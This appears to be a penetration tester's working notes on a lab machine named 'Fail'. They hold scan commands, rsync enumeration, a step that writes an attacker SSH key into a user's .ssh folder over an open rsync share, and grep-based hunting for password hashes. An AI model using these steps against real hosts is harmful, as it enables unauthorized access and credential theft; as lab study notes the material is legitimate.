# Fail Notes

## Data 

IP: 
OS:
Arch:
Hostname:
DNS:
Domain:  / Domain SID:
Machine Purpose: 
Services:
Service Languages:
Users:
Email and Username Formatting:
Credentials:

## Objectives

`\#\# Target Map ![](Fail-map.excalidraw.md)`

#### Machine Connects to list and reason:

[[]] - Reason X

## Data Collected

#### Credentials
```
```

#### HUMINT


#### Solution Inventory Map


#### Todo 


#### Timeline of tasks complete
      

![](reping.png)
searchsploit-rsync.png
sudo nmap -p- -oA nmap/rerescan-script-typo-All-TCP-slow --min-rate 10 192.168.229.126
https://book.hacktricks.xyz/network-services-pentesting/873-pentesting-rsync
https://youssef-ichioui.medium.com/abusing-rsync-misconfiguration-to-get-persistent-access-via-ssh-2507d4a1690b
https://exploit-notes.hdks.org/exploit/network/rsync-pentesting/


phindwhatrsynccantdo.png



bannerandmanenum.png


```bash
nc -nv $ip 873
@RSYNCDL: 31.0 # Server sends this just send it back
# Enumerate files - `#list` 
#list 
# If the send back a directory if @RSYNCD: AUTHREQD then password is required

# Similarly with rsync
rsync -av --list-only rsync://$ipaddress

# SSH Key syncing - https://exploit-notes.hdks.org/exploit/network/rsync-pentesting/

ssh-keygen -f testkey
cat testkey.pub > authorized_keys


rsync -av .ssh/ rsync://192.168.193.126/fox/.ssh

# /etc/rsyncd.secrets

```

whathashitisaskaiforthefirsttime.png

```
-rw-r--r-- 1 root root 47 Jan 18  2018 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/basic/authz_owner/.htpasswd
username:$apr1$1f5oQUl4$21lLXSN7xQOPtNsj5s4Nk/
-rw-r--r-- 1 root root 47 Jan 18  2018 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/basic/file/.htpasswd
username:$apr1$uUMsOjCQ$.BzXClI/B/vZKddgIAJCR.
-rw-r--r-- 1 root root 117 Jan 18  2018 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest_anon/.htpasswd
username:digest anon:25e4077a9344ceb1a88f2a62c9fb60d8
05bbb04
anonymous:digest anon:faa4e5870970cf935bb9674776e6b26a
-rw-r--r-- 1 root root 62 Jan 18  2018 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest/.htpasswd
username:digest private area:fad48d3a7c63f61b5b3567a4105bbb04
-rw-r--r-- 1 root root 62 Jan 18  2018 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest_time/.htpasswd
username:digest private area:fad48d3a7c63f61b5b3567a4105bbb04
-rw-r--r-- 1 root root 62 Jan 18  2018 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest_wrongrelm/.htpasswd
username:wrongrelm:99cd340e1283c6d0ab34734bd47bdc30
4105bbb04
```

Very normal crons
![](cronacronalong.png)

failedintothessh.png

```
fox@fail:/dev/shm$ find / -group fail2ban 2>/dev/null | grep -v '/run/\|/proc/\|/sys/' | xargs -I {} grep -r -e 'ass' {}
```

